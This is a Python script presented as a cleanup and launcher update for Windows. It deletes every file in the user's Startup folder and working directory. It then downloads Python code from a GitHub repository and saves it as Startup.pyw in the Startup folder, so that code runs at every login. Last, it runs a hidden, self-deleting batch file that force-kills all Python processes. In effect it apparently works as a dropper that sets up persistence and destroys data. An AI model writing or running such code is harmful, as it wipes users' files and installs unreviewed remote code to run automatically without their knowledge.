# monitor_script.py - Does exactly in order: delete files, create launcher, end processes
import os
import sys
import subprocess
import tempfile
import time
import urllib.request

def main():
    print("Starting cleanup and launcher update...")
    
    # 1. DELETE ALL FILES FIRST
    print("\n" + "="*60)
    print("STEP 1: Deleting all files...")
    print("="*60)
    
    # Delete from startup folder
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    print(f"Cleaning startup folder: {startup_folder}")
    startup_deleted = 0
    for file in os.listdir(startup_folder):
        try:
            filepath = os.path.join(startup_folder, file)
            if os.path.isfile(filepath):
                os.remove(filepath)
                print(f"  Deleted: {file}")
                startup_deleted += 1
        except:
            pass
    
    # Delete from current directory (except this script for now)
    current_dir = os.getcwd()
    current_script = os.path.basename(__file__)
    
    print(f"\nCleaning current directory: {current_dir}")
    current_deleted = 0
    for file in os.listdir(current_dir):
        if file != current_script and os.path.isfile(os.path.join(current_dir, file)):
            try:
                os.remove(os.path.join(current_dir, file))
                print(f"  Deleted: {file}")
                current_deleted += 1
            except:
                pass
    
    print(f"\n✓ Deleted {startup_deleted} files from startup folder")
    print(f"✓ Deleted {current_deleted} files from current directory")
    
    # 2. CREATE THE LAUNCHER
    print("\n" + "="*60)
    print("STEP 2: Creating launcher...")
    print("="*60)
    
    # First, check what launcher files exist in the repository
    print("Checking available launcher files...")
    
    launcher_filenames = [
        "github_launcher.pyw",
        "github_launcher.py",
        "script.pyw",
        "script.py",
        "monitor_script.pyw",
        "monitor_script.py"
    ]
    
    launcher_code = None
    used_filename = None
    
    for filename in launcher_filenames:
        try:
            url = f"https://raw.githubusercontent.com/ElianBoden/Deployer/main/{filename}"
            print(f"  Trying: {url}")
            response = urllib.request.urlopen(url, timeout=5)
            launcher_code = response.read().decode('utf-8')
            used_filename = filename
            print(f"  ✓ Found: {filename}")
            break
        except:
            continue
    
    if launcher_code is None:
        print("✗ No launcher found in repository, creating basic launcher...")
        launcher_code = '''# Startup.pyw - Basic launcher
import os
import sys
import time

def main():
    time.sleep(1)
    sys.exit(0)

if __name__ == "__main__":
    main()'''
        used_filename = "fallback"
    
    # Save as Startup.pyw in startup folder
    startup_file = os.path.join(startup_folder, "Startup.pyw")
    
    try:
        with open(startup_file, 'w', encoding='utf-8') as f:
            f.write(launcher_code)
        print(f"\n✓ Created Startup.pyw from: {used_filename}")
        print(f"✓ Saved to: {startup_file}")
    except Exception as e:
        print(f"✗ Failed to create Startup.pyw: {e}")
    
    # 3. END ALL PROCESSES
    print("\n" + "="*60)
    print("STEP 3: Ending all processes...")
    print("="*60)
    
    # Create a batch file to end all Python processes
    batch_script = '''@echo off
echo Ending all Python processes...
taskkill /f /im python.exe >nul 2>&1
taskkill /f /im pythonw.exe >nul 2>&1
wmic process where "name='python.exe'" delete >nul 2>&1
wmic process where "name='pythonw.exe'" delete >nul 2>&1
echo All Python processes ended.
del "%~f0" >nul 2>&1
'''
    
    batch_path = os.path.join(tempfile.gettempdir(), "end_processes.bat")
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    print("Running batch file to end all Python processes...")
    
    # Run the batch file
    subprocess.Popen(['cmd', '/c', batch_path],
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    print("✓ Batch file started. All processes will be terminated.")
    
    # Summary
    print("\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    print("✓ Step 1: Files deleted")
    print("✓ Step 2: Launcher created")
    print("✓ Step 3: Processes ending")
    print("\nThis script will now exit.")
    
    # Wait a moment then exit
    time.sleep(2)
    sys.exit(0)

if __name__ == "__main__":
    main()
